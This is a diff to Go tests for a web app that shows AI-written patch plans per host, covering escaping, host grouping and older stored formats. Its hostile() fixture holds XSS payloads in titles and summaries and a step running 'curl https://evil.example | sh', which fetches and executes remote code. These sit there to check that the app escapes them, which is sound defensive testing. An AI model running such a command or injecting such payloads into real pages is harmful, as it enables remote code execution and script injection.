@@ -53,12 +53,20 @@ func hostile() ai.Result {
 	return ai.Result{
 		Summary: `<script>alert("brief")</script> Patch openssl first.`,
 		Actions: []ai.Action{
-			{Title: `Patch <img src=x onerror=alert(1)>`, Why: "Critical and fixable.", Host: "web-01",
-				Command: "sudo apt-get install --only-upgrade libssl3 openssl"},
-			{Title: "Something else", Why: "x", Host: "web-01", Command: "curl https://evil.example | sh"},
+			step(`Patch <img src=x onerror=alert(1)>`, "Critical and fixable.", "web-01", "sudo apt-get install --only-upgrade libssl3 openssl"),
+			step("Something else", "x", "web-01", "curl https://evil.example | sh"),
 		},
-		Notes: "3 kernel CVEs have no fix yet.",
+		Notes: ai.Notes{"3 kernel CVEs have no fix yet."},
 	}
+}
+
+// step is a plan step for one host, with one command if cmd isn't "".
+func step(title, why, host, cmd string) ai.Action {
+	a := ai.Action{Title: title, Why: why, Hosts: []string{host}}
+	if cmd != "" {
+		a.Commands = []ai.Command{{Hosts: []string{host}, Command: cmd}}
+	}
+	return a
 }
 
 func TestAIHostCard(t *testing.T) {
@@ -72,7 +80,7 @@ func TestAIHostCard(t *testing.T) {
 	storeRun(t, e.st, host.OrgID, host.ID, hostile(), testNow.Add(-3*time.Hour))
 	page = e.get("/hosts/acme/web-01", signedIn(e)).Body.String()
 	for _, want := range []string{"&lt;script&gt;alert(", "Patch &lt;img src=x onerror=alert(1)&gt;", "Regenerate",
-		`data-copy="ai-host-0"`, "sudo apt-get install --only-upgrade libssl3 openssl", "by 6.1 sol"} {
+		`data-copy="ai-host-0-0"`, "sudo apt-get install --only-upgrade libssl3 openssl", "by 6.1 sol"} {
 		if !strings.Contains(page, want) {
 			t.Errorf("host page lacks %q", want)
 		}
@@ -165,5 +173,61 @@ func TestAIOff(t *testing.T) {
 	csrf := url.Values{"csrf": {auth.CSRFToken(goodToken)}}
 	if w := e.post("/hosts/acme/web-01/ai", csrf, signedIn(e), origin(e.baseURL)); w.Code != http.StatusNotFound {
 		t.Errorf("AI route while off: %d", w.Code)
+	}
+}
+
+// A brief stored before steps had several hosts (one "host" and
+// "command", notes as one string) still renders, its host shown once.
+func TestAIBriefOldShape(t *testing.T) {
+	e := newEnvCfg(t, "http://127.0.0.1:8080", nil, func(c *Config) { c.AI = &fakeAI{} })
+	host := e.seed()
+	id, err := e.st.StartAIRun(t.Context(), host.OrgID, 0, store.AIBrief, "user:1", "demo", testNow, time.Minute, time.Hour)
+	if err != nil {
+		t.Fatal(err)
+	}
+	old := `{"summary":"Patch web-01 first.","actions":[{"title":"Patch Brotli on web-01","why":"Fixable.","host":"web-01",` +
+		`"command":"sudo apt-get install --only-upgrade libbrotli1"}],"notes":"The kernel findings on web-01's old kernel can wait."}`
+	if err := e.st.FinishAIRun(t.Context(), id, "ok", "m", 1, 1, "", []byte(old), testNow); err != nil {
+		t.Fatal(err)
+	}
+	page := e.get("/", signedIn(e)).Body.String()
+	li := page[strings.Index(page, `<ol class="ai-actions">`):]
+	li = li[:strings.Index(li, "</li>")]
+	chip := `<a class="ref ref-host" href="/hosts/acme/web-01" title="Host">`
+	if !strings.Contains(li, "<strong>Patch Brotli</strong>") || strings.Count(li, chip) != 1 {
+		t.Errorf("old step: the host should show once, after the title:\n%s", li)
+	}
+	if !strings.Contains(li, `data-copy="ai-acme-0-0"`) || !strings.Contains(li, "sudo apt-get install --only-upgrade libbrotli1") ||
+		strings.Contains(li, "ai-cmdhosts") {
+		t.Errorf("old step's command:\n%s", li)
+	}
+	if !strings.Contains(page, `<ul class="muted small ai-notes"><li>The kernel findings on web-01&#39;s old kernel can wait.</li></ul>`) {
+		t.Error("old notes: one point, and no badge before a possessive")
+	}
+}
+
+// One fix on several hosts: the title once, each host once, and the
+// commands grouped by host when they differ.
+func TestAIBriefStepHosts(t *testing.T) {
+	e := newEnvCfg(t, "http://127.0.0.1:8080", nil, func(c *Config) { c.AI = &fakeAI{} })
+	host := e.seed()
+	storeRun(t, e.st, host.OrgID, 0, ai.Result{Summary: "s", Actions: []ai.Action{{
+		Title: "Patch Brotli", Why: "Reboot web-01 after.", Hosts: []string{"web-01", "web-02"},
+		Commands: []ai.Command{{Hosts: []string{"web-01"}, Command: "sudo apt-get install --only-upgrade libbrotli1"},
+			{Hosts: []string{"web-02"}, Command: "sudo apt-get install --only-upgrade libbrotli1 openssl"}},
+	}}, Notes: ai.Notes{"One.", "Two."}}, testNow)
+	page := e.get("/", signedIn(e)).Body.String()
+	li := page[strings.Index(page, `<ol class="ai-actions">`):]
+	li = li[:strings.Index(li, "</li>")]
+	title := li[:strings.Index(li, "ai-why")]
+	if strings.Count(title, `href="/hosts/acme/web-01"`) != 1 || !strings.Contains(title, " web-02") {
+		t.Errorf("title row:\n%s", title)
+	}
+	if strings.Count(li, `class="ai-cmdhosts small"`) != 2 || !strings.Contains(li, "2 commands") ||
+		!strings.Contains(li, `id="ai-acme-0-1"`) || !strings.Contains(li, "libbrotli1 openssl</pre>") {
+		t.Errorf("command groups:\n%s", li)
+	}
+	if !strings.Contains(page, "<li>One.</li><li>Two.</li>") {
+		t.Error("notes as points")
 	}
 }
